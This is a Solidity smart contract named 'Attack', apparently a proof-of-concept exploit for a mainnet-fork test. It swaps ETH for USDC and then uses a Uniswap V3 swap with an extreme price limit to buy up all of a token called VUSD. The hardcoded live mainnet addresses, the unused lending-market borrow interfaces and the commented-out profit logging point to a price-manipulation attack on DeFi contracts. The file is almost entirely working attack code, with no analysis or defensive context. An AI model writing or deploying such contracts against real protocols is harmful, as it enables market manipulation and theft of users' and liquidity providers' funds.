pragma solidity ^0.8.4;

import "./IERC20.sol";
import "./INPosition.sol";
import "./IPair-weth-usdc.sol";
import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
import "./IWeth.sol";
import "./IUniMath.sol";
import "hardhat/console.sol";


interface IFToken is IERC20 {
    function mint(uint256 mintAmount) external returns (uint256);

    function borrow(uint256 borrowAmount) external returns (uint256);

    function underlying() external returns (address);
}

interface IComptroller {
    function enterMarkets(address[] calldata cTokens)
        external
        returns (uint256[] memory);
}

contract Attack {
    IERC20 public constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 public constant VUSD = IERC20(0x677ddbd918637E5F2c79e164D402454dE7dA8619);
    IWETH public constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    IPair public constant WUpool = IPair(0x8dDE0A1481b4A14bC1015A5a8b260ef059E9FD89);
    ISwapRouter public constant router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    INonfungiblePositionManager public constant nonfungible = INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);

    constructor() {
        WETH.approve(address(this),type(uint256).max);
        USDC.approve(address(this),type(uint256).max);
    }

    function getUSDC() internal {
        WETH.deposit{value:65000000000000000000}();
        uint256 USDCamount = 250_000 * 1e6;
        ISwapRouter.ExactOutputSingleParams memory params = ISwapRouter.ExactOutputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(USDC),
            fee:3000,
            recipient:address(this),
            deadline:1e10,
            amountOut:USDCamount,
            amountInMaximum:type(uint256).max,
            sqrtPriceLimitX96:0
        });

        uint256 amountIn = router.exactOutputSingle(params);
        console.log("get USDC amount:",amountIn);
    }

    function buyAllVUSD() internal{
        WUpool.swap(
            address(this),
            false,
            type(int256).max,
            UniswapMath.getSqrtRatioAtTick(UniswapMath.MAX_TICK - 1),
            " "
        );
    }

    function uniswapV3SwapCallback(int256 amount0Delta,int256 amount1Delta,bytes calldata) external {
        USDC.transfer(address(WUpool),uint256(amount1Delta));
        // console.log("get VUSD amount:",amount1Delta);
        // console.log("profit:  ",balance / 1 ether);
    }

    function start() public {
        getUSDC();
        buyAllVUSD();
    }


    receive() external payable {}

}

